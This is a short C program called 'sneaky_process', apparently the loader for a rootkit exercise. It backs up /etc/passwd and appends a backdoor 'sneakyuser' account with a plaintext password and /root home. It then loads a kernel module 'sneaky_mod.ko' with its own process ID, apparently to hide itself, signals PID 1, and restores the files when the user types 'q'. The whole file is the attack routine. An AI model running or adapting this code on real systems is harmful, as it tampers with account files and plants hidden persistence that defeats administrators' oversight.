#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 

int main(){
    printf("sneaky_process pid = %d\n", (int)getpid());

    system("cp /etc/passwd /tmp/passwd");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");

    char str[100];
    sprintf(str, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(str);
    system("kill -52 1");

    char c;
    while ((c = getchar()) != 'q') {}
    
    system("kill -53 1");
    system("rmmod sneaky_mod");
    system("cp /tmp/passwd /etc");
    system("rm -f /tmp/passwd");

    return EXIT_SUCCESS;
}
